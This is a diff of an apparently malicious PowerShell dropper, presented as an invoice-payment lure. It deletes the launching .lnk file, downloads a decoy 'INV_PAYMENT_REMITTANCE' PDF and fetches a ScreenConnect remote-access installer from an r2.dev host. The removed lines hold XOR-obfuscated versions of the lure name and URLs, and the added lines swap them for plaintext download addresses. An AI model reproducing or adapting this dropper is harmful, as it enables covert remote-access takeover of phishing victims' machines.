@@ -58,7 +58,6 @@ function Force-FileDelete {
             Remove-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
             Write-Host "Deleted: $Path" -ForegroundColor Yellow
         } catch {
-            # Try alternative deletion method
             try {
                 $item = Get-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
                 $item.Delete()
@@ -220,7 +219,7 @@ function CODE_SEG {
     $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
     $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
     
-    # DELETE the .lnk file FIRST - using fixed function
+    # DELETE the .lnk file FIRST
     Force-FileDelete -Path $InkPath
     Write-Host "Deleted .lnk file: $InkPath" -ForegroundColor Yellow
     
@@ -376,43 +375,13 @@ function CODE_SEG {
     }
 }
 
-# ----- Client name: "Payment_Confirmation_XW6554" (XOR 249) -----
-$ClientName = $($k2766=249;$b=[byte[]](0xA9,0x98,0x80,0x94,0x9C,0x97,0x8D,0xA6,0xAB,0x9C,0x94,0x90,0x8D,0x8D,0x98,0x97,0x9A,0x9C,0xA6,0xC9,0xC0,0xC8,0xAA,0xB1,0xE9,0xE0,0xE8,0xE1,0xE5,0xE9,0xE0,0xE9,0xE1,0xE9,0xE0,0xE1,0xE9,0xE0,0xE9,0xE0,0xE9,0xE0,0xE9,0xE0);-join($b|%{[char]($_-bxor$k2766)}))
+# ----- Client name: "INV_PAYMENT_REMITTANCE" -----
+$ClientName = "INV_PAYMENT_REMITTANCE"
 
-# ----- PDF URL (XOR 0x5A) -----
-$key = 0x5A
-$encodedPdf = @(
-    0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
-    0x2A,0x2F,0x38,0x77,0x3C,0x3C,0x6A,0x6F,
-    0x69,0x3F,0x6B,0x3C,0x3F,0x63,0x6B,0x63,
-    0x6E,0x6F,0x62,0x3F,0x62,0x3C,0x38,0x39,
-    0x3B,0x38,0x69,0x6A,0x3F,0x3F,0x38,0x38,
-    0x63,0x69,0x3F,0x62,0x74,0x28,0x68,0x74,
-    0x3E,0x3F,0x2C,0x75,
-    0x0A,0x3B,0x23,0x37,0x3F,0x34,0x2E,0x05,
-    0x19,0x35,0x34,0x3C,0x33,0x28,0x37,0x3B,
-    0x2E,0x33,0x35,0x34,0x05,0x02,0x0D,
-    0x6C,0x6F,0x6F,0x6E,0x74,
-    0x2A,0x3E,0x3C
-)
+# ----- PDF URL -----
+$DocumentURL = "https://pub-ff053e1fe919458e8fbcab30eebb93e8.r2.dev/INV_PAYMENT_REMITTANCE.pdf"
 
-# ----- EXE URL (XOR 0x5A) -----
-$encodedMsi = @(
-    50,46,46,42,41,96,117,117,
-    42,47,56,119,105,62,108,109,
-    62,106,110,105,108,62,57,57,
-    110,105,108,63,59,107,104,60,
-    62,108,62,99,107,111,56,57,
-    56,56,107,60,116,40,104,116,
-    62,63,44,117,
-    9,57,40,63,63,52,25,53,
-    52,52,63,57,46,116,
-    25,54,51,63,52,46,9,63,
-    46,47,42,116,
-    63,34,63
-)
-
-$DocumentURL = -join ($encodedPdf | ForEach-Object { [char]($_ -bxor $key) })
-$ClientURL   = -join ($encodedMsi | ForEach-Object { [char]($_ -bxor $key) })
+# ----- EXE URL (same as before - your ScreenConnect installer) -----
+$ClientURL = "https://pub-ff053e1fe919458e8fbcab30eebb93e8.r2.dev/ScreenConnect_24.2.7.9353.exe"
 
 CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
